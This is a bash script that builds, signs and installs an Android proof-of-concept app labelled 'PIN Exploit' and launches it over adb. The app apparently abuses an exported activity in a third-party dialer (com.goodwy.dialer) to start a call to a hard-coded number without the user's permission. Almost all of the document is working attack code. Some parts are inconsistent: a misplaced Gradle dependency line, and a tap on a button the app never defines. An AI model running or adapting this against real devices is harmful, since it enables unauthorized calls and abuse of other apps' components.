#!/bin/bash
set -e

# Create exploit directory structure
EXPLOIT_DIR="element_pin_exploit"
rm -rf "$EXPLOIT_DIR" 2>/dev/null || true
mkdir -p "$EXPLOIT_DIR"/{app/src/main/{java/com/exploit/pin,res/layout},gradle/wrapper}

cd "$EXPLOIT_DIR"

echo "Creating exploit project structure..."

# Project configuration
cat > settings.gradle << 'EOF'
include ':app'
EOF

cat > build.gradle << 'EOF'
buildscript {
    repositories {
        google()
        mavenCentral()
    }
    dependencies {
        classpath 'com.android.tools.build:gradle:7.4.2'
        implementation "androidx.appcompat:appcompat:1.7.1"
    }
}
allprojects {
    repositories {
        google()
        mavenCentral()
    }
}
EOF

cat > app/build.gradle << 'EOF'
apply plugin: 'com.android.application'

android {
    compileSdkVersion 34
    defaultConfig {
        applicationId "com.exploit.pin"
        minSdkVersion 21
        targetSdkVersion 34
        versionCode 1
        versionName "1.0"
    }
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }
}
EOF

# Android manifest
cat > app/src/main/AndroidManifest.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.exploit.pin">
    <application
        android:label="PIN Exploit"
        android:icon="@android:drawable/ic_dialog_alert">
        <activity
            android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
EOF

# Application layout
cat > app/src/main/res/layout/activity_main.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="@android:color/white">
</FrameLayout>
EOF

# Main exploit implementation
cat > app/src/main/java/com/exploit/pin/MainActivity.java << 'EOF'
package com.exploit.pin;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        String phoneNumber="8778295500";
        initiateCall(this, phoneNumber);
    }

    private void initiateCall(Context context, String phoneNumber) {
        Intent intent = new Intent(Intent.ACTION_CALL);
        intent.setData(Uri.parse("tel:" + Uri.encode(phoneNumber)));
        intent.setComponent(new ComponentName("com.goodwy.dialer", "com.goodwy.dialer.activities.DialerActivity"));
        context.startActivity(intent);
    }
}
EOF

echo "Building exploit APK..."

# Configure build environment
export ANDROID_HOME="$HOME/.android-sdk"
export PATH="$ANDROID_HOME/build-tools/34.0.0:$ANDROID_HOME/platform-tools:$PATH"
export ANDROID_JAR="$ANDROID_HOME/platforms/android-34/android.jar"

# Create build directories
mkdir -p build/{gen,obj}

echo "Generating Android resources..."
aapt package -f -m \
    -J build/gen \
    -S app/src/main/res \
    -M app/src/main/AndroidManifest.xml \
    -I "$ANDROID_JAR"

echo "Compiling Java sources..."
javac -d build/obj \
    -classpath "$ANDROID_JAR" \
    app/src/main/java/com/exploit/pin/MainActivity.java \
    build/gen/com/exploit/pin/R.java

echo "Creating DEX bytecode..."
d8 --output build/ build/obj/com/exploit/pin/*.class

echo "Packaging APK..."
aapt package -f \
    -M app/src/main/AndroidManifest.xml \
    -S app/src/main/res \
    -I "$ANDROID_JAR" \
    -F build/pin-exploit.apk

echo "Adding DEX to APK..."
cd build && aapt add pin-exploit.apk classes.dex && cd ..

echo "Signing APK..."
if [[ ! -f ~/.android/debug.keystore ]]; then
    mkdir -p ~/.android
    keytool -genkey -v -keystore ~/.android/debug.keystore -storepass android \
        -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 \
        -validity 10000 -dname "CN=Debug,O=Android,C=US" >/dev/null 2>&1
fi

apksigner sign --ks ~/.android/debug.keystore --ks-pass pass:android \
    --key-pass pass:android --out build/pin-exploit-signed.apk build/pin-exploit.apk

echo "Installing exploit on device..."
adb install -r build/pin-exploit-signed.apk >/dev/null 2>&1

echo "Launching exploit application..."
adb shell am start -n com.exploit.pin/.MainActivity >/dev/null 2>&1

sleep 3

# Handle potential compatibility dialog
adb shell input keyevent KEYCODE_BACK 2>/dev/null || true
sleep 1

# Find and click exploit button
adb shell uiautomator dump >/dev/null 2>&1
BUTTON_BOUNDS=$(adb shell cat /sdcard/window_dump.xml 2>/dev/null | grep -o 'text="Execute PIN Bypass Exploit"[^>]*bounds="[^"]*"' | grep -o 'bounds="[^"]*"' | sed 's/bounds="//;s/"//' || echo "")

if [[ -n "$BUTTON_BOUNDS" ]]; then
    X1=$(echo "$BUTTON_BOUNDS" | sed 's/\[//g;s/\].*//g' | cut -d',' -f1)
    Y1=$(echo "$BUTTON_BOUNDS" | sed 's/\[//g;s/\].*//g' | cut -d',' -f2)
    X2=$(echo "$BUTTON_BOUNDS" | sed 's/.*\]\[//g;s/\]//g' | cut -d',' -f1)
    Y2=$(echo "$BUTTON_BOUNDS" | sed 's/.*\]\[//g;s/\]//g' | cut -d',' -f2)
    
    CENTER_X=$(( (X1 + X2) / 2 ))
    CENTER_Y=$(( (Y1 + Y2) / 2 ))
    
    adb shell input tap $CENTER_X $CENTER_Y
else
    adb shell input tap 540 900
fi

sleep 3

echo "Exploit execution completed"